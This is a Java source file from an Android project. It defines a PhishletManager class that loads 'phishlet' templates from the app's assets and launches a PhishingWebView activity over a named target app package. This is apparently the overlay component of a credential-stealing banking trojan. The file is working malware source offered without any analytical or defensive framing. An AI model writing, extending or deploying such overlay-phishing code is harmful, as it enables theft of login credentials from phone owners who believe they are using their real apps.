package com.xrc.system.features;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.xrc.system.core.Constants;
import com.xrc.system.ui.PhishingWebView;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.HashMap;
import java.util.Map;

public class PhishletManager {
    private static final String TAG = Constants.TAG + ":Phishlet";
    private static PhishletManager instance;
    private final Context ctx;
    private final Map<String, JSONObject> phishlets;
    private String activePhishlet = "";
    private String activeTarget = "";

    private PhishletManager(Context ctx) {
        this.ctx = ctx.getApplicationContext();
        this.phishlets = new HashMap<>();
        loadPhishlets();
    }

    public static synchronized PhishletManager get(Context ctx) {
        if (instance == null) {
            instance = new PhishletManager(ctx);
        }
        return instance;
    }

    private void loadPhishlets() {
        try {
            String[] files = ctx.getAssets().list("phishlets");
            if (files == null) return;
            for (String file : files) {
                if (file.endsWith(".json")) {
                    String content = readAsset("phishlets/" + file);
                    JSONObject phishlet = new JSONObject(content);
                    String id = phishlet.optString("id", file.replace(".json", ""));
                    phishlets.put(id, phishlet);
                }
            }
            Log.i(TAG, "Loaded " + phishlets.size() + " phishlets");
        } catch (IOException | JSONException e) {
            Log.e(TAG, "Phishlet load failed", e);
        }
    }

    private String readAsset(String path) throws IOException {
        InputStream is = ctx.getAssets().open(path);
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            sb.append(line).append("\n");
        }
        reader.close();
        return sb.toString();
    }

    public void showPhishlet(String id, String targetPackage) {
        JSONObject phishlet = phishlets.get(id);
        if (phishlet == null) {
            Log.w(TAG, "Phishlet not found: " + id);
            return;
        }
        activePhishlet = id;
        activeTarget = targetPackage;
        Intent intent = new Intent(ctx, PhishingWebView.class);
        intent.putExtra("phishlet_id", id);
        intent.putExtra("target_pkg", targetPackage);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        ctx.startActivity(intent);
    }

    public void hidePhishlet() {
        activePhishlet = "";
        activeTarget = "";
        Intent intent = new Intent(ctx, PhishingWebView.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.putExtra("close", true);
        ctx.startActivity(intent);
    }

    public JSONObject getPhishlet(String id) {
        return phishlets.get(id);
    }

    public String getActivePhishlet() {
        return activePhishlet;
    }

    public String getActiveTarget() {
        return activeTarget;
    }

    public boolean hasPhishlet(String id) {
        return phishlets.containsKey(id);
    }
}
